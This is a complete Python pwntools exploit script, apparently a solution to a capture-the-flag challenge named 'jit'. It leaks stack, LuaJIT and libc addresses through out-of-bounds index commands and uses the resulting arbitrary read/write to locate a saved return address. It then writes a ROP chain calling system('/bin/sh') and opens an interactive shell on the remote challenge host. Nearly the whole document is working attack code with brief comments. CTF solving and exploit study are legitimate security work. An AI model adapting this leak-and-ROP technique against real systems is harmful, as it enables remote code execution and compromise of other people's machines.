#!/usr/bin/env python3
from pwn import *
import re

context.binary = ELF('./main', checksec=False)
context.log_level = 'info'

HOST = 'jit.ctf.ingeniums.club'
PORT = 6703

# Offsets for Ubuntu libluajit-5.1.so.2.1.1703358377 and local libc.
LJ_GOT_MPROTECT = 0x90008
LJ_LEAK_TO_BASE = 0xC24A  # leaked luajit code ptr - this = ELF base

LIBC_OFF_MPROTECT = 0x125C40
LIBC_OFF_ENVIRON = 0x20AD58
LIBC_OFF_SYSTEM = 0x58750
LIBC_OFF_EXIT = 0x47BA0
LIBC_OFF_BINSH = 0x1CB42F
LIBC_OFF_POP_RDI_RET = 0x10F78B
LIBC_OFF_RET = 0x2882F

# Stable on this challenge build: *(environ - 0x150) is saved RIP to main+0x271
RET_FROM_ENV_DELTA = 0x150

# Must stay <= 2^53 for exact integer transport through Lua tonumber(double).
BIG_LIMIT = 10**13

num_re = re.compile(rb'(\d+)ULL')


class BadLayout(Exception):
    pass


class Exploit:
    def __init__(self, io):
        self.io = io
        self.stack_base = None

    def send_cmd(self, cmd: bytes):
        self.io.sendlineafter(b'>> ', cmd)

    @staticmethod
    def parse_ull(line: bytes):
        m = num_re.search(line)
        if not m:
            return None
        return int(m.group(1))

    @staticmethod
    def untag_ptr(v: int):
        if v is None:
            return None
        if v > (1 << 63):
            return v & 0x7FFFFFFFFFFF
        return v

    def get(self, idx: int):
        self.send_cmd(f'get {idx}'.encode())
        return self.parse_ull(self.io.recvline())

    def set(self, idx: int, val: int):
        self.send_cmd(f'set {idx} {val}'.encode())

    def pop(self):
        self.send_cmd(b'pop')
        return self.parse_ull(self.io.recvline())

    def push(self, val: int):
        self.send_cmd(f'push {val}'.encode())

    def read_q(self, addr: int):
        if addr < self.stack_base or (addr - self.stack_base) % 8 != 0:
            raise BadLayout(f'cannot read address {hex(addr)} from base {hex(self.stack_base)}')
        idx = (addr - self.stack_base) // 8
        self.set(14, idx)
        v = self.pop()
        if v is None:
            raise BadLayout('read returned non-ULL output')
        return v

    def write_q(self, addr: int, val: int):
        if addr < self.stack_base or (addr - self.stack_base) % 8 != 0:
            raise BadLayout(f'cannot write address {hex(addr)} from base {hex(self.stack_base)}')
        idx = (addr - self.stack_base) // 8
        self.set(14, idx - 1)
        self.push(val)

    def leak_state(self):
        # Warm state similarly to local characterization.
        for i in range(10, 17):
            self.get(i)

        leak16 = self.get(16)
        if leak16 is None:
            raise BadLayout('failed to leak get 16')

        self.stack_base = leak16 + 0x38
        log.info(f'stack_base = {hex(self.stack_base)}')

        self.set(15, BIG_LIMIT)

        # Stable luajit code leak after this exact sequence.
        luajit_leak = None
        for i in range(18, 40):
            self.set(14, i)
            luajit_leak = self.pop()

        luajit_code = self.untag_ptr(luajit_leak)
        if luajit_code is None or luajit_code < 0x700000000000:
            raise BadLayout('failed to leak luajit code pointer')

        luajit_base = luajit_code - LJ_LEAK_TO_BASE
        log.info(f'luajit_code = {hex(luajit_code)}')
        log.info(f'luajit_base = {hex(luajit_base)}')

        mprotect_ptr = self.read_q(luajit_base + LJ_GOT_MPROTECT)
        libc_base = mprotect_ptr - LIBC_OFF_MPROTECT
        log.info(f'mprotect@libc = {hex(mprotect_ptr)}')
        log.info(f'libc_base = {hex(libc_base)}')

        environ_addr = libc_base + LIBC_OFF_ENVIRON
        if environ_addr < self.stack_base:
            raise BadLayout('libc environ symbol not reachable from current stack base')

        environ_ptr = self.read_q(environ_addr)
        if environ_ptr < self.stack_base:
            raise BadLayout('environ pointer below reachable range')
        log.info(f'environ = {hex(environ_ptr)}')

        ret_addr = environ_ptr - RET_FROM_ENV_DELTA
        if ret_addr < self.stack_base:
            raise BadLayout('target return address below reachable range')

        saved_rip = self.read_q(ret_addr)
        log.info(f'target saved RIP @ {hex(ret_addr)} = {hex(saved_rip)}')

        # Heuristic sanity check for main+0x271.
        if (saved_rip & 0xFFF) != 0x271:
            raise BadLayout('saved RIP does not look like main+0x271')

        return libc_base, ret_addr

    def plant_rop(self, libc_base: int, ret_addr: int):
        pop_rdi_ret = libc_base + LIBC_OFF_POP_RDI_RET
        ret = libc_base + LIBC_OFF_RET
        binsh = libc_base + LIBC_OFF_BINSH
        system = libc_base + LIBC_OFF_SYSTEM
        exit_ = libc_base + LIBC_OFF_EXIT

        chain = [ret, pop_rdi_ret, binsh, system, exit_]
        for i, q in enumerate(chain):
            self.write_q(ret_addr + i * 8, q)

        log.success('ROP chain written on C stack')

    def trigger_shell(self):
        self.send_cmd(b'x')


def start(remote_target: bool, host: str, port: int):
    if remote_target:
        return remote(host, port)
    return process('./main', stdin=PIPE, stdout=PIPE, stderr=STDOUT)


def main():
    args_host = args.HOST or HOST
    args_port = int(args.PORT or PORT)
    remote_mode = args.REMOTE

    for attempt in range(1, 80):
        io = start(remote_mode, args_host, args_port)
        try:
            log.info(f'attempt {attempt}')
            ex = Exploit(io)
            libc_base, ret_addr = ex.leak_state()
            ex.plant_rop(libc_base, ret_addr)
            ex.trigger_shell()

            # Quick check before handing over interactive.
            io.sendline(b'echo PWNED && id')
            data = io.recv(timeout=1.0)
            if data:
                log.success('shell seems alive')
                log.info(data.decode(errors='ignore'))
            io.interactive()
            return
        except (EOFError, BadLayout) as e:
            log.warning(f'attempt {attempt} failed: {e}')
            io.close()
            continue

    log.failure('could not get a usable layout after many retries')


if __name__ == '__main__':
    main()
